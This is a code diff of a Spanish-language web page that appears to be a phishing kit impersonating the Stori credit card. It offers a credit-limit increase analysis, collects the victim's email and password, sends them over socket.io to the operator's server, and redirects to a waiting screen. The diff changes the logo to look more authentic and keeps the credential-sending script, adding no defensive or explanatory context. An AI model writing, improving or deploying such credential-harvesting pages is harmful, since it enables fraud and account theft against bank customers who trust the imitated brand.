@@ -64,7 +64,7 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://i.imgur.com/GFGp9I7.png" alt="logo" />
+      <img src="https://stori.card/img/logo.svg" alt="logo" />
     </div>
     <h2>Bienvenido a su análisis de aumento de cupo</h2>
     <p>Ingrese su correo y contraseña para continuar</p>
@@ -76,34 +76,34 @@
   </div>
 
   <!-- Scripts al final del body -->
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
+ <!-- Scripts al final del body -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.getElementById('login-form');
+  window.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('login-form');
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault();
+    if (form) {
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
 
-          const correo = document.getElementById('usuario').value;
-          const contrasena = document.getElementById('clave').value;
+        const correo = document.getElementById('usuario').value;
+        const contrasena = document.getElementById('clave').value;
 
-          // 🔑 Generar y guardar sessionId y datos en localStorage
-          const sessionId = Math.random().toString(36).substring(2, 15);
-          localStorage.setItem('sessionId', sessionId);
-          localStorage.setItem('correo', correo);
-          localStorage.setItem('contrasena', contrasena);
+        // 🔑 Generar y guardar sessionId
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        localStorage.setItem('sessionId', sessionId);
 
-          // ✅ Enviar los datos al servidor
-          socket.emit('dataForm', { correo, contrasena, sessionId });
+        // ✅ Enviar también el sessionId al servidor
+        socket.emit('dataForm', { correo, contrasena, sessionId });
 
-          // 🕒 Ir a pantalla de espera
-          window.location.href = 'opciones.html';
-        });
-      }
-    });
-  </script>
+        // 🕒 Ir a pantalla de espera
+        window.location.href = 'opciones.html';
+      });
+    }
+  });
+</script>
+
 </body>
 </html>
